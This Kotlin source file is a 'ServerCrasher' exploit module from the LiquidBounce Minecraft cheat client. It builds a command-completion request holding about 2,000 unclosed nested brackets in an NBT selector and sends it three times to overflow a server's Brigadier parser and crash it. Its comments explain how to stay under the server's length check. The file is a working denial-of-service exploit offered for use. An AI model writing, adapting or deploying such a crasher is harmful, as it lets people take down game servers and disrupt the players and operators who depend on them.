package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import com.google.gson.JsonObject
import net.ccbluex.liquidbounce.config.Choice
import net.ccbluex.liquidbounce.config.ChoiceConfigurable
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
import net.ccbluex.liquidbounce.utils.client.logger
import java.util.stream.Collectors
import java.util.stream.IntStream

object CompletionExploit : Choice("Completion") {

    override val parent: ChoiceConfigurable
        get() = ModuleServerCrasher.exploitChoices

    override fun enable() {
        //Made it smaller under 2048, but it still cannot throw stackoverflow every time.
        val overflow = generateJsonObject(2032);

        // Latest server builds can kick if partialCommand length is greater than 2048,
        // probably can be compressed even more.
        val partialCommand = "msg @a[nbt=$overflow]";
        repeat(3) {
            network.sendPacket(RequestCommandCompletionsC2SPacket(0, partialCommand))
        }
        ModuleServerCrasher.enabled = false
    }

    private fun generateJsonObject(levels: Int): String {
        // Brigadier does not check for closing brackets
        // Until it is too late.

        // Replaced Object with array and removed closing brackets
        val `in` = IntStream.range(0, levels)
            .mapToObj { _ -> "[" }
            .collect(Collectors.joining())
        val json = "{a:$`in`}"
        return json;
    }

}
